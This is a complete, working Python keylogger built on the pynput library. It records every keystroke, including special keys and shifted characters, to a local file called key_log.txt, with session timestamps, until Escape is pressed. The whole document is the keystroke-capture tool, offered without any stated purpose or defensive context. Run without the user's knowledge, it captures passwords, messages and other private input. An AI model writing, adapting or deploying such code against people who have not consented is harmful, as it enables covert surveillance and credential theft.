from pynput.keyboard import Listener, Key
from datetime import datetime
import os

# Define the log file path
log_file = "key_log.txt"

# Helper variable to track when Shift is pressed
shift_pressed = False

# Function to write to log file in a cleaner format
def write_log(content):
    with open(log_file, "a") as file:
        file.write(content)

# Function to handle key press events
def on_press(key):
    global shift_pressed
    try:
        # If the Shift key is pressed, note it but don't log as a separate event
        if key == Key.shift or key == Key.shift_r:
            shift_pressed = True
        else:
            # Log uppercase if Shift is pressed, otherwise log lowercase
            char = key.char.upper() if shift_pressed else key.char
            write_log(char)  # Log each character directly
    except AttributeError:
        # Log readable names for special keys
        special_keys = {
            Key.space: " ",
            Key.enter: "\n",
            Key.tab: "\t",
            Key.backspace: "<backspace>"
        }
        key_name = special_keys.get(key, f"<{key.name}>")
        write_log(key_name)

# Function to handle key release events
def on_release(key):
    global shift_pressed
    # Track Shift key release
    if key == Key.shift:
        shift_pressed = False
    # Stop the listener on 'Escape' key press
    elif key == Key.esc:
        write_log("\n[Logging stopped]\n")
        return False

# Start the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    if not os.path.isfile(log_file):
        write_log(f"[Logging started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}]\n")
    else:
        write_log(f"\n[Logging started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}]\n")
    listener.join()
